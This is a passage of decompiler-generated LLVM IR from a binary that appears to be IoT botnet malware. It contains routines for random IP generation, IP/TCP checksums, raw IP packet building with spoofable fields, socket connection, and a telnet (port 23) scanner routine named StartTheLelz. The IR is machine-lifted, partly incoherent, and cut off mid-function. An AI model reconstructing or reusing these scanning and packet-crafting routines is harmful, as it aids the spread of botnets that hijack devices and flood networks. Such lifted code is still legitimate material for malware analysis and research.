  uselistorder label %dec_label_pc_804a42c, { 1, 0 }
  uselistorder label %dec_label_pc_804a3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a3cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a39c, { 1, 0 }
  uselistorder label %dec_label_pc_804a36c, { 1, 0 }
  uselistorder label %dec_label_pc_804a33c, { 1, 0 }
  uselistorder label %dec_label_pc_804a30c, { 1, 0 }
  uselistorder label %dec_label_pc_804a2dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ac, { 1, 0 }
  uselistorder label %dec_label_pc_804a27c, { 1, 0 }
  uselistorder label %dec_label_pc_804a24c, { 1, 0 }
  uselistorder label %dec_label_pc_804a21c, { 1, 0 }
  uselistorder label %dec_label_pc_804a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a1bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a18c, { 1, 0 }
  uselistorder label %dec_label_pc_804a15c, { 1, 0 }
  uselistorder label %dec_label_pc_804a12c, { 1, 0 }
  uselistorder label %dec_label_pc_804a0fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a0cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a09c, { 1, 0 }
  uselistorder label %dec_label_pc_804a06c, { 1, 0 }
  uselistorder label %dec_label_pc_804a03c, { 1, 0 }
  uselistorder label %dec_label_pc_804a00c, { 1, 0 }
  uselistorder label %dec_label_pc_8049fdc, { 1, 0 }
  uselistorder label %dec_label_pc_8049fac, { 1, 0 }
  uselistorder label %dec_label_pc_8049f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f4c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f1c, { 1, 0 }
  uselistorder label %dec_label_pc_8049eec, { 1, 0 }
  uselistorder label %dec_label_pc_8049ebc, { 1, 0 }
  uselistorder label %dec_label_pc_8049e8c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e2c, { 1, 0 }
  uselistorder label %dec_label_pc_8049dfc, { 1, 0 }
  uselistorder label %dec_label_pc_8049dcc, { 1, 0 }
  uselistorder label %dec_label_pc_8049d9c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d3c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8049cdc, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c4e9 = load i32, i32* @global_var_80617a8.240, align 8
  %v1_804c4f2 = call i32 @ntohl(i32 %v0_804c4e9)
  %v5_804c4fa = and i32 %v1_804c4f2, %arg1
  %v1_804c500 = call i32 @rand_cmwc(i32 %v5_804c4fa)
  %v1_804c50a = sub i32 -1, %arg1
  %v2_804c50c = and i32 %v1_804c500, %v1_804c50a
  %v5_804c50e = xor i32 %v2_804c50c, %v5_804c4fa
  ret i32 %v5_804c50e
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c518 = load i32, i32* @ebx, align 4
  %v4_804c54c33 = add i32 %arg2, -1
  %v9_804c54c34 = sub i32 0, %arg2
  %v10_804c54c35 = and i32 %arg2, %v9_804c54c34
  %v11_804c54c36 = icmp slt i32 %v10_804c54c35, 0
  %v12_804c54c37 = icmp eq i32 %v4_804c54c33, 0
  %v13_804c54c38 = icmp slt i32 %v4_804c54c33, 0
  %v3_804c55039 = icmp eq i1 %v13_804c54c38, %v11_804c54c36
  %v4_804c55040 = icmp eq i1 %v12_804c54c37, false
  %v5_804c55041 = and i1 %v4_804c55040, %v3_804c55039
  br i1 %v5_804c55041, label %dec_label_pc_804c52c.lr.ph, label %dec_label_pc_804c552

dec_label_pc_804c52c.lr.ph:                       ; preds = %entry
  %v4_804c52f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c52c

dec_label_pc_804c52c:                             ; preds = %dec_label_pc_804c52c.lr.ph, %dec_label_pc_804c52c
  %v4_804c52f = phi i32 [ %v4_804c52f.pre, %dec_label_pc_804c52c.lr.ph ], [ %v6_804c52f, %dec_label_pc_804c52c ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_804c52c.lr.ph ], [ %v9_804c541, %dec_label_pc_804c52c ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_804c52c.lr.ph ], [ %v4_804c548, %dec_label_pc_804c52c ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_804c52c.lr.ph ], [ %v23_804c544, %dec_label_pc_804c52c ]
  %v3_804c53e42 = phi i32 [ 0, %dec_label_pc_804c52c.lr.ph ], [ %v6_804c53e, %dec_label_pc_804c52c ]
  %v4_804c52c = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804c52f = load i16, i16* %stack_var_4.043, align 2
  %v3_804c52f = zext i16 %v2_804c52f to i32
  %v5_804c52f = and i32 %v4_804c52f, -65536
  %v6_804c52f = or i32 %v5_804c52f, %v3_804c52f
  store i32 %v6_804c52f, i32* @ecx, align 4
  %sext51 = mul i32 %v3_804c53e42, 65536
  %v4_804c53e = sdiv i32 %sext51, 65536
  %v6_804c53e = add nsw i32 %v3_804c52f, %v4_804c53e
  %v11_804c53e = icmp ult i32 %v6_804c53e, %v4_804c53e
  %v26_804c53e = trunc i32 %v6_804c53e to i16
  %v7_804c541 = zext i1 %v11_804c53e to i16
  %v9_804c541 = add i16 %v7_804c541, %stack_var_-24.045
  %v5_804c544 = add i32 %v4_804c52c, 2
  %v23_804c544 = inttoptr i32 %v5_804c544 to i16*
  %v4_804c548 = add i32 %stack_var_8.044, -2
  %v4_804c54c = add i32 %stack_var_8.044, -3
  %v9_804c54c = sub i32 2, %stack_var_8.044
  %v10_804c54c = and i32 %v4_804c548, %v9_804c54c
  %v11_804c54c = icmp slt i32 %v10_804c54c, 0
  %v12_804c54c = icmp eq i32 %v4_804c54c, 0
  %v13_804c54c = icmp slt i32 %v4_804c54c, 0
  %v3_804c550 = icmp eq i1 %v13_804c54c, %v11_804c54c
  %v4_804c550 = icmp eq i1 %v12_804c54c, false
  %v5_804c550 = and i1 %v4_804c550, %v3_804c550
  br i1 %v5_804c550, label %dec_label_pc_804c52c, label %dec_label_pc_804c552

dec_label_pc_804c552:                             ; preds = %dec_label_pc_804c52c, %entry
  %v3_804c53e.lcssa = phi i16 [ 0, %entry ], [ %v26_804c53e, %dec_label_pc_804c52c ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804c544, %dec_label_pc_804c52c ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804c548, %dec_label_pc_804c52c ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804c541, %dec_label_pc_804c52c ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804c596.preheader, label %dec_label_pc_804c558

dec_label_pc_804c558:                             ; preds = %dec_label_pc_804c552
  %v1_804c55b = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804c55b = load i8, i8* %v1_804c55b, align 1
  %v3_804c55b = zext i8 %v2_804c55b to i32
  %v4_804c55b = load i32, i32* @ecx, align 4
  %v5_804c55b = and i32 %v4_804c55b, -256
  %v6_804c55b = or i32 %v5_804c55b, %v3_804c55b
  store i32 %v6_804c55b, i32* @ecx, align 4
  %v4_804c569 = sext i16 %v3_804c53e.lcssa to i32
  %v6_804c569 = add nsw i32 %v3_804c55b, %v4_804c569
  %v11_804c569 = icmp ult i32 %v6_804c569, %v4_804c569
  %v26_804c569 = trunc i32 %v6_804c569 to i16
  %v7_804c56c = zext i1 %v11_804c569 to i16
  %v9_804c56c = add i16 %v7_804c56c, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804c596.preheader

dec_label_pc_804c596.preheader:                   ; preds = %dec_label_pc_804c558, %dec_label_pc_804c552
  %v3_804c57b.ph = phi i16 [ %v3_804c53e.lcssa, %dec_label_pc_804c552 ], [ %v26_804c569, %dec_label_pc_804c558 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804c552 ], [ %v9_804c56c, %dec_label_pc_804c558 ]
  %v4_804c59620 = sext i16 %v3_804c57b.ph to i32
  %v4_804c59921 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804c59c22 = udiv i32 %v4_804c59620, 65536
  %v4_804c59c23 = mul i32 %v4_804c59921, 65536
  %v5_804c59c24 = or i32 %v4_804c59c23, %v3_804c59c22
  %v2_804c5a025 = udiv i32 %v4_804c59921, 65536
  %v2_804c5a326 = or i32 %v5_804c59c24, %v2_804c5a025
  %v3_804c5a327 = icmp eq i32 %v2_804c5a326, 0
  %v1_804c5a728 = icmp eq i1 %v3_804c5a327, false
  br i1 %v1_804c5a728, label %dec_label_pc_804c571, label %dec_label_pc_804c5a9

dec_label_pc_804c571:                             ; preds = %dec_label_pc_804c596.preheader, %dec_label_pc_804c571
  %v2_804c5a031 = phi i32 [ %v2_804c5a0, %dec_label_pc_804c571 ], [ %v2_804c5a025, %dec_label_pc_804c596.preheader ]
  %v5_804c59c30 = phi i32 [ %v5_804c59c, %dec_label_pc_804c571 ], [ %v5_804c59c24, %dec_label_pc_804c596.preheader ]
  %v4_804c59629 = phi i32 [ %v4_804c596, %dec_label_pc_804c571 ], [ %v4_804c59620, %dec_label_pc_804c596.preheader ]
  %v2_804c58c = add i32 %v5_804c59c30, %v4_804c59629
  %v7_804c58c = icmp ult i32 %v2_804c58c, %v4_804c59629
  %v3_804c58e = zext i1 %v7_804c58c to i32
  %v5_804c58e = add nuw nsw i32 %v3_804c58e, %v2_804c5a031
  %sext = mul i32 %v2_804c58c, 65536
  %v4_804c596 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804c58e, 65536
  %v4_804c599 = sdiv i32 %sext50, 65536
  %v3_804c59c = udiv i32 %v4_804c596, 65536
  %v5_804c59c = or i32 %sext50, %v3_804c59c
  %v2_804c5a0 = udiv i32 %v4_804c599, 65536
  %v2_804c5a3 = or i32 %v5_804c59c, %v2_804c5a0
  %v3_804c5a3 = icmp eq i32 %v2_804c5a3, 0
  %v1_804c5a7 = icmp eq i1 %v3_804c5a3, false
  br i1 %v1_804c5a7, label %dec_label_pc_804c571, label %dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge

dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge: ; preds = %dec_label_pc_804c571
  store i32 %v5_804c59c30, i32* @ecx, align 4
  br label %dec_label_pc_804c5a9

dec_label_pc_804c5a9:                             ; preds = %dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge, %dec_label_pc_804c596.preheader
  %v4_804c596.lcssa = phi i32 [ %v4_804c596, %dec_label_pc_804c596.dec_label_pc_804c5a9_crit_edge ], [ %v4_804c59620, %dec_label_pc_804c596.preheader ]
  %v1_804c5ac = urem i32 %v4_804c596.lcssa, 65536
  %v1_804c5ae = xor i32 %v1_804c5ac, 65535
  store i32 %v0_804c518, i32* @ebx, align 4
  ret i32 %v1_804c5ae

; uselistorder directives
  uselistorder i32 %v5_804c59c, { 1, 0 }
  uselistorder i32 %v4_804c596, { 1, 0, 2 }
  uselistorder i32 %v2_804c5a025, { 1, 0 }
  uselistorder i32 %v4_804c59921, { 1, 0 }
  uselistorder i32 %v4_804c59620, { 2, 1, 0 }
  uselistorder i32 %v4_804c569, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804c53e.lcssa, { 1, 0 }
  uselistorder i32 %v4_804c54c, { 1, 0 }
  uselistorder i32 %v6_804c53e, { 1, 2, 0 }
  uselistorder i32 %v4_804c53e, { 1, 0 }
  uselistorder i32 %v6_804c52f, { 1, 0 }
  uselistorder label %dec_label_pc_804c571, { 1, 0 }
  uselistorder label %dec_label_pc_804c52c, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_804c5cf = add i32 %tmp9, 12
  %v2_804c5cf = inttoptr i32 %v1_804c5cf to i32*
  %v3_804c5cf = load i32, i32* %v2_804c5cf, align 4
  %v1_804c5d8 = add i32 %tmp9, 16
  %v2_804c5d8 = inttoptr i32 %v1_804c5d8 to i32*
  %v3_804c5d8 = load i32, i32* %v2_804c5d8, align 4
  %v1_804c5eb = call i32 @htons(i32 20)
  %v1_804c605 = call i32 @malloc(i32 32)
  store i32 %v1_804c605, i32* %ecx.global-to-local, align 4
  %v2_804c618 = inttoptr i32 %v1_804c605 to i32*
  store i32 %v3_804c5cf, i32* %v2_804c618, align 4
  %v1_804c61d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c61d = add i32 %v1_804c61d, 4
  %v3_804c61d = inttoptr i32 %v2_804c61d to i32*
  store i32 %v3_804c5d8, i32* %v3_804c61d, align 4
  %v1_804c623 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c623 = add i32 %v1_804c623, 8
  %v3_804c623 = inttoptr i32 %v2_804c623 to i32*
  store i32 0, i32* %v3_804c623, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_804c62c = add i32 %v1_804c605, 12
  store i32 %v1_804c62c, i32* %edx.global-to-local, align 4
  %v1_804c62f = inttoptr i32 %tmp1 to i32*
  %v2_804c62f = load i32, i32* %v1_804c62f, align 4
  %v2_804c631 = inttoptr i32 %v1_804c62c to i32*
  store i32 %v2_804c62f, i32* %v2_804c631, align 4
  %v0_804c633 = load i32, i32* @ecx, align 4
  %v1_804c633 = add i32 %v0_804c633, 4
  %v2_804c633 = inttoptr i32 %v1_804c633 to i32*
  %v3_804c633 = load i32, i32* %v2_804c633, align 4
  %v1_804c636 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c636 = add i32 %v1_804c636, 4
  %v3_804c636 = inttoptr i32 %v2_804c636 to i32*
  store i32 %v3_804c633, i32* %v3_804c636, align 4
  %v0_804c639 = load i32, i32* @ecx, align 4
  %v1_804c639 = add i32 %v0_804c639, 8
  %v2_804c639 = inttoptr i32 %v1_804c639 to i32*
  %v3_804c639 = load i32, i32* %v2_804c639, align 4
  %v1_804c63c = load i32, i32* %edx.global-to-local, align 4
  %v2_804c63c = add i32 %v1_804c63c, 8
  %v3_804c63c = inttoptr i32 %v2_804c63c to i32*
  store i32 %v3_804c639, i32* %v3_804c63c, align 4
  %v0_804c63f = load i32, i32* @ecx, align 4
  %v1_804c63f = add i32 %v0_804c63f, 12
  %v2_804c63f = inttoptr i32 %v1_804c63f to i32*
  %v3_804c63f = load i32, i32* %v2_804c63f, align 4
  %v1_804c642 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c642 = add i32 %v1_804c642, 12
  %v3_804c642 = inttoptr i32 %v2_804c642 to i32*
  store i32 %v3_804c63f, i32* %v3_804c642, align 4
  %v0_804c645 = load i32, i32* @ecx, align 4
  %v1_804c645 = add i32 %v0_804c645, 16
  %v2_804c645 = inttoptr i32 %v1_804c645 to i32*
  %v3_804c645 = load i32, i32* %v2_804c645, align 4
  %v1_804c648 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c648 = add i32 %v1_804c648, 16
  %v3_804c648 = inttoptr i32 %v2_804c648 to i32*
  store i32 %v3_804c645, i32* %v3_804c648, align 4
  %v2_804c651 = inttoptr i32 %v1_804c605 to i16*
  %v3_804c651 = call i32 @csum(i16* %v2_804c651, i32 32)
  %v1_804c663 = call i32 @free(i32 %v1_804c605)
  %v4_804c66b = urem i32 %v3_804c651, 65536
  ret i32 %v4_804c66b

; uselistorder directives
  uselistorder i32 %v1_804c605, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804c676 = load i32, i32* @ebp, align 4
  store i32 %v0_804c676, i32* %stack_var_-4, align 4
  %v4_804c67c = sext i8 %tmp8 to i32
  %v4_804c682 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804c69f = add i32 %v4_804c682, 1
  %v2_804c69f = inttoptr i32 %v1_804c69f to i8*
  store i8 0, i8* %v2_804c69f, align 1
  %v1_804c6a6 = add i32 %tmp5, 20
  %v1_804c6ac = trunc i32 %v1_804c6a6 to i16
  %v3_804c6ac = add i32 %v4_804c682, 2
  %v4_804c6ac = inttoptr i32 %v3_804c6ac to i16*
  store i16 %v1_804c6ac, i16* %v4_804c6ac, align 2
  %v2_804c6b0 = call i32 @rand_cmwc(i32 %v4_804c67c)
  %v1_804c6ba = trunc i32 %v2_804c6b0 to i16
  %v3_804c6ba = add i32 %v4_804c682, 4
  %v4_804c6ba = inttoptr i32 %v3_804c6ba to i16*
  store i16 %v1_804c6ba, i16* %v4_804c6ba, align 2
  %v1_804c6c1 = add i32 %v4_804c682, 6
  %v2_804c6c1 = inttoptr i32 %v1_804c6c1 to i16*
  store i16 0, i16* %v2_804c6c1, align 2
  %v1_804c6ca = add i32 %v4_804c682, 8
  %v2_804c6ca = inttoptr i32 %v1_804c6ca to i8*
  store i8 -1, i8* %v2_804c6ca, align 1
  %v3_804c6d4 = add i32 %v4_804c682, 9
  %v4_804c6d4 = inttoptr i32 %v3_804c6d4 to i8*
  store i8 %tmp8, i8* %v4_804c6d4, align 1
  %v1_804c6da = add i32 %v4_804c682, 10
  %v2_804c6da = inttoptr i32 %v1_804c6da to i16*
  store i16 0, i16* %v2_804c6da, align 2
  %v2_804c6e6 = add i32 %v4_804c682, 12
  %v3_804c6e6 = inttoptr i32 %v2_804c6e6 to i32*
  %v2_804c6ef = add i32 %v4_804c682, 16
  %v3_804c6ef = inttoptr i32 %v2_804c6ef to i32*
  store i32 %tmp, i32* %v3_804c6ef, align 4
  %v2_804c6f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c6f2, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 2, 0, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804c6fa = add i32 %arg1, -2
  %v9_804c6fa = sub i32 1, %arg1
  %v10_804c6fa = and i32 %v9_804c6fa, %arg1
  %v11_804c6fa = icmp slt i32 %v10_804c6fa, 0
  %v12_804c6fa = icmp eq i32 %v4_804c6fa, 0
  %v13_804c6fa = icmp slt i32 %v4_804c6fa, 0
  %v3_804c6fe = icmp eq i1 %v13_804c6fa, %v11_804c6fa
  %v4_804c6fe = icmp eq i1 %v12_804c6fa, false
  %v5_804c6fe = and i1 %v4_804c6fe, %v3_804c6fe
  br i1 %v5_804c6fe, label %dec_label_pc_804c709, label %dec_label_pc_804c71e

dec_label_pc_804c709:                             ; preds = %entry
  %v1_804c70f = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804c71e

dec_label_pc_804c71e:                             ; preds = %entry, %dec_label_pc_804c709
  %storemerge = phi i32 [ 0, %dec_label_pc_804c709 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804c6fa, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c71e, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804c73d = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804c748 = icmp eq i32 %v1_804c73d, 0
  %v1_804c74c = icmp eq i1 %v4_804c748, false
  br i1 %v1_804c74c, label %dec_label_pc_804c75a, label %dec_label_pc_804c74e

dec_label_pc_804c74e:                             ; preds = %entry
  br label %dec_label_pc_804c7ff

dec_label_pc_804c75a:                             ; preds = %entry
  %v1_804c75d = add i32 %v1_804c73d, 12
  %v2_804c75d = inttoptr i32 %v1_804c75d to i32*
  %v3_804c75d = load i32, i32* %v2_804c75d, align 4
  %v1_804c765 = add i32 %v1_804c73d, 16
  %v2_804c765 = inttoptr i32 %v1_804c765 to i32*
  %v3_804c765 = load i32, i32* %v2_804c765, align 4
  %v1_804c768 = inttoptr i32 %v3_804c765 to i32*
  %v2_804c768 = load i32, i32* %v1_804c768, align 4
  %v15_804c771 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804c776 = call i32 @bcopy(i32 %v2_804c768, i32 %v15_804c771, i32 %v3_804c75d)
  %v1_804c7811 = zext i16 %arg2 to i32
  %v1_804c78a = call i32 @htons(i32 %v1_804c7811)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804c7a5 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804c7b0 = ptrtoint i32* %stack_var_-32 to i32
  %v5_804c7c0 = call i32 @__GI_setsockopt(i32 %v3_804c7a5, i32 6, i32 1, i32 %v2_804c7b0, i32 4)
  %v13_804c7c8 = icmp eq i32 %v3_804c7a5, -1
  %v1_804c7cc = icmp eq i1 %v13_804c7c8, false
  br i1 %v1_804c7cc, label %dec_label_pc_804c7d7, label %dec_label_pc_804c7ce

dec_label_pc_804c7ce:                             ; preds = %dec_label_pc_804c75a
  br label %dec_label_pc_804c7ff

dec_label_pc_804c7d7:                             ; preds = %dec_label_pc_804c75a
  %v2_804c76e = ptrtoint i32* %stack_var_-28 to i32
  %v3_804c7e3 = call i32 @__libc_connect(i32 %v3_804c7a5, i32 %v2_804c76e, i32 16)
  %v10_804c7eb = icmp eq i32 %v3_804c7e3, -1
  %v1_804c7ee = icmp eq i1 %v10_804c7eb, false
  br i1 %v1_804c7ee, label %dec_label_pc_804c7f9, label %dec_label_pc_804c7f0

dec_label_pc_804c7f0:                             ; preds = %dec_label_pc_804c7d7
  br label %dec_label_pc_804c7ff

dec_label_pc_804c7f9:                             ; preds = %dec_label_pc_804c7d7
  br label %dec_label_pc_804c7ff

dec_label_pc_804c7ff:                             ; preds = %dec_label_pc_804c7f0, %dec_label_pc_804c7ce, %dec_label_pc_804c74e, %dec_label_pc_804c7f9
  %v3_804c7ff = phi i32 [ 0, %dec_label_pc_804c7f0 ], [ 0, %dec_label_pc_804c7ce ], [ 0, %dec_label_pc_804c74e ], [ %v3_804c7a5, %dec_label_pc_804c7f9 ]
  ret i32 %v3_804c7ff

; uselistorder directives
  uselistorder i32 %v3_804c7a5, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804c7ff, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_804c80a = ptrtoint i32* %stack_var_-636 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804c81b = call i32 @__GI_time(i32* null)
  store i32 %v2_804c81b, i32* %eax.global-to-local, align 4
  store i32 %v2_804c81b, i32* @ebx, align 4
  %v1_804c825 = call i32 @rand_cmwc(i32 0)
  %v1_804c82a = load i32, i32* @ebx, align 4
  %v2_804c82a = xor i32 %v1_804c82a, %v1_804c825
  store i32 %v2_804c82a, i32* @eax, align 4
  %v1_804c830 = call i32 @srand(i32 %v2_804c82a)
  store i32 %v1_804c830, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_804c846 = call i32 @htons(i32 23)
  %v2_804c855 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804c85b = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804c85b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804c873 = call i32 @malloc(i32 513)
  store i32 %v1_804c873, i32* %edx.global-to-local, align 4
  store i32 513, i32* %eax.global-to-local, align 4
  %v3_804c88f = inttoptr i32 %v1_804c873 to i8*
  %v4_804c88f = call i32 @__GI_memset(i8* %v3_804c88f, i32 0, i32 513)
  %v2_804c8a8 = mul i32 %arg2, 28
  %v1_804c8ad = add i32 %v2_804c8a8, 30
  %v2_804c8b0 = and i32 %v1_804c8ad, -16
  %v2_804c8b6 = sub i32 %v15_804c80a, %v2_804c8b0
  %v1_804c8c4 = add i32 %v2_804c8b6, 15
  %v2_804c8c7 = and i32 %v1_804c8c4, -16
  %v2_804c8e4 = mul i32 %arg2, 5
  store i32 %v2_804c8e4, i32* %edx.global-to-local, align 4
  %v1_804c8ea = inttoptr i32 %v2_804c8c7 to i8*
  store i32 %v2_804c8c7, i32* @edi, align 4
  %v1_804c8ef = and i32 %v1_804c8c4, -256
  store i32 %v1_804c8ef, i32* %eax.global-to-local, align 4
  %v5_804c8f1 = call i8* @_memset(i8* %v1_804c8ea, i32 %v1_804c8ef, i32 %v2_804c8e4)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804c97e50 = icmp sgt i32 %arg2, 0
  br i1 %v5_804c97e50, label %dec_label_pc_804c8fc.lr.ph, label %dec_label_pc_804c98b

dec_label_pc_804c8fc.lr.ph:                       ; preds = %entry
  %v2_804c950 = or i32 %v2_804c8c7, 9
  br label %dec_label_pc_804c8fc

dec_label_pc_804c8fc:                             ; preds = %dec_label_pc_804c8fc, %dec_label_pc_804c8fc.lr.ph
  %storemerge251 = phi i32 [ 0, %dec_label_pc_804c8fc.lr.ph ], [ %v4_804c975, %dec_label_pc_804c8fc ]
  %v2_804c910 = mul i32 %storemerge251, 28
  %v2_804c912 = add i32 %v2_804c910, %v2_804c8c7
  store i32 %v2_804c912, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804c91a = inttoptr i32 %v2_804c912 to i32*
  store i32 0, i32* %v2_804c91a, align 4
  %v0_804c91c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c91c = add i32 %v0_804c91c, 4
  store i32 %v1_804c91c, i32* %eax.global-to-local, align 4
  %v0_804c91f = load i32, i32* %edx.global-to-local, align 4
  %v2_804c91f = inttoptr i32 %v1_804c91c to i32*
  store i32 %v0_804c91f, i32* %v2_804c91f, align 4
  %v0_804c921 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c921 = add i32 %v0_804c921, 4
  store i32 %v1_804c921, i32* %eax.global-to-local, align 4
  %v0_804c924 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c924 = inttoptr i32 %v1_804c921 to i32*
  store i32 %v0_804c924, i32* %v2_804c924, align 4
  %v0_804c926 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c926 = add i32 %v0_804c926, 4
  store i32 %v1_804c926, i32* %eax.global-to-local, align 4
  %v0_804c929 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c929 = inttoptr i32 %v1_804c926 to i32*
  store i32 %v0_804c929, i32* %v2_804c929, align 4
  %v0_804c92b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c92b = add i32 %v0_804c92b, 4
  store i32 %v1_804c92b, i32* %eax.global-to-local, align 4
  %v0_804c92e = load i32, i32* %edx.global-to-local, align 4
  %v2_804c92e = inttoptr i32 %v1_804c92b to i32*
  store i32 %v0_804c92e, i32* %v2_804c92e, align 4
  %v0_804c930 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c930 = add i32 %v0_804c930, 4
  store i32 %v1_804c930, i32* %eax.global-to-local, align 4
  %v0_804c933 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c933 = inttoptr i32 %v1_804c930 to i32*
  store i32 %v0_804c933, i32* %v2_804c933, align 4
  %v0_804c935 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c935 = add i32 %v0_804c935, 4
  %v0_804c938 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c938 = inttoptr i32 %v1_804c935 to i32*
  store i32 %v0_804c938, i32* %v2_804c938, align 4
  %v3_804c950 = add i32 %v2_804c950, %v2_804c910
  %v4_804c950 = inttoptr i32 %v3_804c950 to i8*
  store i8 1, i8* %v4_804c950, align 1
  %v1_804c96d = add i32 %v2_804c912, 24
  store i32 %v1_804c96d, i32* %edx.global-to-local, align 4
  %v2_804c973 = inttoptr i32 %v1_804c96d to i32*
  store i32 %v1_804c873, i32* %v2_804c973, align 4
  %v4_804c975 = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804c975, i32* %eax.global-to-local, align 4
  %exitcond52 = icmp eq i32 %v4_804c975, %arg2
  br i1 %exitcond52, label %dec_label_pc_804c98b, label %dec_label_pc_804c8fc

dec_label_pc_804c98b:                             ; preds = %entry, %dec_label_pc_804c8fc, %dec_label_pc_804c98b
  %stack_var_-48.0 = phi i32 [ %v4_804c98b, %dec_label_pc_804c98b ], [ 0, %dec_label_pc_804c8fc ], [ 0, %entry ]
